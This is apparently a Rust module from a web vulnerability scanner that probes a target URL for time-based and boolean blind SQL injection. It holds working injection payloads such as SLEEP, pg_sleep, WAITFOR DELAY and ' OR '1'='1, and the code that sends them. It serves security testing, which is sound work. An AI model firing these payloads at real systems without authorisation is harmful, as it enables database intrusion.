use crate::domain::entities::*;

/// Time-based blind SQL injection detector.
///
/// V1 implementation: Sends time-delay payloads and measures response
/// time differential against baseline. Uses multiple iterations for
/// statistical confidence.
pub struct TimingAnalyzer {
    client: reqwest::Client,
    /// Default delay seconds to inject in timing payloads
    delay_seconds: u32,
    /// Number of iterations per payload for confidence
    iterations: u32,
}

impl TimingAnalyzer {
    pub fn new() -> Self {
        Self {
            client: reqwest::Client::builder()
                .timeout(std::time::Duration::from_secs(30))
                .build()
                .unwrap_or_default(),
            delay_seconds: 5,
            iterations: 3,
        }
    }

    /// Detect time-based blind SQL injection.
    ///
    /// Sends baseline request first, then injects timing payloads
    /// and compares response times.
    pub async fn detect_time_based_sqli(
        &self,
        target_url: &str,
    ) -> Result<Vec<RawBlindFinding>, String> {
        let mut findings = Vec::new();

        // 1. Measure baseline response time
        let baseline_ms = self.measure_response_time(target_url).await?;

        // 2. Time-based SQLi payloads
        let payloads = vec![
            format!("' OR SLEEP({})-- ", self.delay_seconds),
            format!("' OR pg_sleep({})-- ", self.delay_seconds),
            format!("'; WAITFOR DELAY '0:0:{}'-- ", self.delay_seconds),
            format!("' OR BENCHMARK(10000000,SHA1('test'))-- "),
            format!("1' AND (SELECT * FROM (SELECT(SLEEP({})))a)-- ", self.delay_seconds),
        ];

        for payload in &payloads {
            let mut total_delayed_ms: u32 = 0;
            let mut successful_delays: u32 = 0;

            for _ in 0..self.iterations {
                // Inject payload as query parameter
                let test_url = if target_url.contains('?') {
                    format!("{}&q={}", target_url, urlencoding::encode(payload))
                } else {
                    format!("{}?q={}", target_url, urlencoding::encode(payload))
                };

                match self.measure_response_time(&test_url).await {
                    Ok(delayed_ms) => {
                        total_delayed_ms += delayed_ms;
                        if delayed_ms > baseline_ms * 2 {
                            successful_delays += 1;
                        }
                    }
                    Err(_) => {
                        // Timeout could also indicate successful delay injection
                        total_delayed_ms += (self.delay_seconds * 1000) + 1000;
                        successful_delays += 1;
                    }
                }
            }

            let avg_delayed_ms = total_delayed_ms / self.iterations.max(1);

            // Only report if we see consistent delays
            if successful_delays >= 2 {
                findings.push(RawBlindFinding {
                    vulnerability_type: BlindVulnType::BlindSqliTimeBased,
                    detection_method: BlindDetectionMethod::TimingAnalysis {
                        delay_ms: avg_delayed_ms,
                    },
                    raw_confidence: 0.0, // Will be scored by domain service
                    payload_used: payload.clone(),
                    evidence: BlindEvidence {
                        dom_snapshot: None,
                        timing_comparison: Some(TimingData {
                            baseline_ms,
                            delayed_ms: avg_delayed_ms,
                            iterations: self.iterations,
                            delay_ratio: avg_delayed_ms as f32 / baseline_ms.max(1) as f32,
                        }),
                        callback_received: None,
                        payload_hash: format!("{:x}", md5_hash(payload)),
                    },
                    target_url: target_url.to_string(),
                });
            }
        }

        Ok(findings)
    }

    /// Detect boolean-based blind SQL injection.
    ///
    /// Sends true/false condition payloads and compares response bodies
    /// for differential analysis.
    pub async fn detect_boolean_sqli(
        &self,
        target_url: &str,
    ) -> Result<Vec<RawBlindFinding>, String> {
        let mut findings = Vec::new();

        // Boolean-based payloads: true condition vs false condition
        let boolean_pairs = vec![
            ("' OR '1'='1", "' OR '1'='2"),
            ("' OR 1=1-- ", "' OR 1=2-- "),
            ("1' AND 1=1-- ", "1' AND 1=2-- "),
        ];

        for (true_payload, false_payload) in &boolean_pairs {
            let true_url = if target_url.contains('?') {
                format!(
                    "{}&q={}",
                    target_url,
                    urlencoding::encode(true_payload)
                )
            } else {
                format!(
                    "{}?q={}",
                    target_url,
                    urlencoding::encode(true_payload)
                )
            };

            let false_url = if target_url.contains('?') {
                format!(
                    "{}&q={}",
                    target_url,
                    urlencoding::encode(false_payload)
                )
            } else {
                format!(
                    "{}?q={}",
                    target_url,
                    urlencoding::encode(false_payload)
                )
            };

            let true_body = self.fetch_body(&true_url).await.unwrap_or_default();
            let false_body = self.fetch_body(&false_url).await.unwrap_or_default();

            // If responses differ significantly, boolean SQLi likely
            if !true_body.is_empty()
                && !false_body.is_empty()
                && true_body != false_body
                && (true_body.len() as f64 - false_body.len() as f64).abs() > 50.0
            {
                findings.push(RawBlindFinding {
                    vulnerability_type: BlindVulnType::BlindSqliBoolean,
                    detection_method: BlindDetectionMethod::DifferentialAnalysis,
                    raw_confidence: 0.7,
                    payload_used: format!("TRUE: {} | FALSE: {}", true_payload, false_payload),
                    evidence: BlindEvidence {
                        dom_snapshot: None,
                        timing_comparison: None,
                        callback_received: None,
                        payload_hash: format!("{:x}", md5_hash(true_payload)),
                    },
                    target_url: target_url.to_string(),
                });
            }
        }

        Ok(findings)
    }

    /// Measure baseline response time for a URL
    async fn measure_response_time(&self, url: &str) -> Result<u32, String> {
        let start = std::time::Instant::now();
        self.client
            .get(url)
            .send()
            .await
            .map_err(|e| format!("Request failed: {}", e))?;
        Ok(start.elapsed().as_millis() as u32)
    }

    /// Fetch response body for differential analysis
    async fn fetch_body(&self, url: &str) -> Result<String, String> {
        let resp = self
            .client
            .get(url)
            .send()
            .await
            .map_err(|e| format!("Request failed: {}", e))?;
        resp.text()
            .await
            .map_err(|e| format!("Body read failed: {}", e))
    }
}

/// Simple hash function for payload fingerprinting (not cryptographic)
fn md5_hash(input: &str) -> u64 {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    let mut hasher = DefaultHasher::new();
    input.hash(&mut hasher);
    hasher.finish()
}
